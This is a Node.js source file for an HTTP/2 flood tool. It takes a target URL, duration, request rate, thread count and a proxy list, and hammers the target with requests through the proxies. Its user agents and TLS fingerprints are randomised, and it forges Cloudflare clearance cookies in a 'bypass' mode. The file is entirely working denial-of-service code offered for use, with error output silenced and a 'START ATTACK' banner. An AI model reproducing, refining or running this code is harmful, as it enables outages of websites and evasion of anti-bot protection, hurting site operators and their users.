const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require("colors");
const randomUseragent = require('random-useragent');
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}

// S? d?ng h�m d? l?y m?t ciphersuite ng?u nhi�n v� in ra k?t qu?
const randomTLSCiphersuite = getRandomTLSCiphersuite();


  const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
  const language_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'tt-RU,tt;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
    console.log(`(${'START ATTACK'.magenta}) -> `+`(${proxies.slice(1,2)})`.blue);
    setTimeout(() => {
      console.log(`(${'START ATTACK'.magenta}) -> `+`(${proxies.slice(3,4)})`.blue);
    }, 100 * 200 );
    setTimeout(() => {
      console.log(`(${'START ATTACK'.magenta}) -> `+`(${proxies.slice(5,6)})`.blue);
    }, 120 * 200 );
    process.stdout.write("Loading: 10%\n".blue);
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n".blue);
}, 500 * process.argv[3] );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n".blue);
}, process.argv[3] * 1000);
        cluster.fork();

    }
} else {for (let i = 0; i < args.Rate; i++) 
    { setInterval(runFlooder , randomIntn(10,100)) }}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}const jalist = [
  "002205d0f96c37c5e660b9f041363c1",
  "073eede15b2a5a0302d823ecbd5ad15b",
  "0b61c673ee71fe9ee725bd687c455809",
  "6cd1b944f5885e2cfbe98a840b75eeb8",
  "94c485bca29d5392be53f2b8cf7f4304",
  "b4f4e6164f938870486578536fc1ffce",
  "b8f81673c0e1d29908346f3bab892b9b",
  "baaac9b6bf25ad098115c71c59d29e51",
  "bc6c386f480ee97b9d9e52d472b772d8",
  "da949afd9bd6df820730f8f171584a71",
  "f58966d34ff9488a83797b55c804724d",
  "fd6314b03413399e4f23d1524d206692",
  "0a81538cf247c104edb677bdb8902ed5",
  "0b6592fd91d4843c823b75e49b43838d",
  "0ffee3ba8e615ad22535e7f771690a28",
  "1c15aca4a38bad90f9c40678f6aface9",
  "5163bc7c08f57077bc652ec370459c2f",
  "a88f1426c4603f2a8cd8bb41e875cb75",
  "b03910cc6de801d2fcfa0c3b9f397df4",
  "bfcc1a3891601edb4f137ab7ab25b840",
  "ce694315cbb81ce95e6ae4ae8cbafde6",
  "f15797a734d0b4f171a86fd35c9a5e43"
 ];

var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
					var architectures = {
					  "Windows NT 10.0": `${Math.random() < 0.5 ? `Win64; x64; rv:10${randstra(1)}.0` : `Win64; x64; rv:10${randstra(3)}.0`}`,
            "Windows NT 11.0":`${Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}; rv:10${randstra(1)}.0` : `Win64; x64; rv:10${randstra(2)}.0`}`,
					  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`,
					  "X11": `${Math.random() < 0.5 ? `Linux x86_64; rv:10${randstra(1)}.0` : `Linux x86_64; rv:10${randstra(3)}.0`}`
					};
					var browserss = [
						`Firefox/117.0`,
						`Firefox/116.0`,
						`Firefox/115.0`,
						`Firefox/114.0`,
						`Firefox/113.0`,
					  `Firefox/112.0`,
						`Firefox/111.0`,
						`Firefox/110.0`,
					]
					var browsers = [
					  "Chrome/116.0.0.0 Safari/537.36 Edg/116", 
					 "Chrome/115.0.0.0 Safari/537.36 Edg/115",
					 "Chrome/114.0.0.0 Safari/537.36 Edg/114",
					 "Chrome/113.0.0.0 Safari/537.36 Edg/113",
					 "Chrome/112.0.0.0 Safari/537.36 Edg/112",
					 "Chrome/111.0.0.0 Safari/537.36 Edg/111",
					 "Chrome/110.0.0.0 Safari/537.36 Edg/110",
					 "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
					 "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
					 "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
					 "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
					 "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
					 "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
					 "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
					  "Chrome/116.0.0.0 Safari/537.36 OPR/102",
            "Chrome/100.0.4896.127 Safari/537.36",
					 
					];
					function getRandomValue(arr) {
					  const randomIndex = Math.floor(Math.random() * arr.length);
					  return arr[randomIndex];
					}
					function randstra(length) {
            const characters = "0123456789";
            let result = "";
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
              result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
          }
          const sec12 = {
            "Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203":'"Microsoft Edge";v="116"',
            "Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0":'"Opera GX";v="100"',
            "Chrome/116.0.0.0 Safari/537.36" :'"Google Chrome";v="116"',
            "Version/16.5 Safari/605.1.15": '"Safari";v="15.0.0", "Chrome";v="116"'
    }
					const randomOS = getRandomValue(operatingSystems);
					const randomArch = architectures[randomOS]; 
					const randomBrowser = getRandomValue(browsers);
                    const brand = sec12[randomBrowser]; 
					const randomsBrowser = getRandomValue(browserss);
                    const secua = `"Chromium";v="116", "Not)A;Brand";v="24", ${brand}`
				  var uas = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 1000;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t d? tr? ng?u nhi�n t? 1000 d?n 6000 mili gi�y
	  interval = randomDelay(1000, 7000);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1000;
	}
  
  const type = [
    "text/plain"
    , "text/html"
    , "application/json"
    , "application/xml"
    , "multipart/form-data"
    , "application/octet-stream"
    , "image/jpeg"
    , "image/png"
    , "audio/mpeg"
    , "video/mp4"
    , "application/javascript"
    , "application/pdf"
    , "application/vnd.ms-excel"
    , "application/vnd.ms-powerpoint"
    , "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    , "application/vnd.openxmlformats-officedocument.presentationml.presentation"
    , "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    , "application/zip"
    , "image/gif"
    , "image/bmp"
    , "image/tiff"
    , "audio/wav"
    , "audio/midi"
    , "video/avi"
    , "video/mpeg"
    , "video/quicktime"
    , "text/csv"
    , "text/xml"
    , "text/css"
    , "text/javascript"
    , "application/graphql"
    , "application/x-www-form-urlencoded"
    , "application/vnd.api+json"
    , "application/ld+json"
    , "application/x-pkcs12"
    , "application/x-pkcs7-certificates"
    , "application/x-pkcs7-certreqresp"
    , "application/x-pem-file"
    , "application/x-x509-ca-cert"
    , "application/x-x509-user-cert"
    , "application/x-x509-server-cert"
    , "application/x-bzip"
    , "application/x-gzip"
    , "application/x-7z-compressed"
    , "application/x-rar-compressed"
    , "application/x-shockwave-flash"
  ];
  platform = [
            "Windows",
            "Macintosh",
            "Linux",
            "iOS",
            "Android",
            "PlayStation 4",
            "iPhone",
            "iPad",
            "Other"
        ],
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
let headers = {
  ":authority": parsedTarget.host,
  ":method": "GET",
  "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
  ":path": parsedTarget.path,
  ":scheme": "https",
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "upgrade-insecure-requests": "1",
  "cookie" : "cf_clearance=" +randstr(43) +"-" +randstrsValue +"-0-1-" +randstr(8) +"." +randstr(8) +"." +randstr(8) +"-" +randstrs(3) +"." +"2" +"." +randstrsValue,
  "user-agent" :uas,
}

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 15
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 1073741823
   };
tls.DEFAULT_MAX_VERSION = 'TLSv1.3'
 
    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
           "h2", 'http/1.1', "spdy/3.1"
       ],
       ciphers: randomTLSCiphersuite,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       decodeEmails: false,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
      host : parsedTarget.host,
      servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      
      settings: {
        initialWindowSize: 15564991,
        maxFrameSize : 236619,
    },
    createConnection: () => tlsConn,
    socket: connection,
});

client.settings({
  initialWindowSize: 15564991,
  maxFrameSize : 236619,
});

client.on('stream', (stream, headers) => {
  stream.priority = Math.random() < 0.5 ? 0:1;
  stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x83)] = 1000;
  stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x84)] = 236619;
  stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x85)] = Math.random() < 0.5 ? 65536 : 65535;
})
client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
               const request = client.request(headers)
               .on("response", response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end(); 

           }
       }, interval);
      return;
    });
    client.on("close", () => {
        client.destroy();
        tlsConn.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {
    client.destroy();
    tlsConn.destroy();
    connection.destroy();
    return
});
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});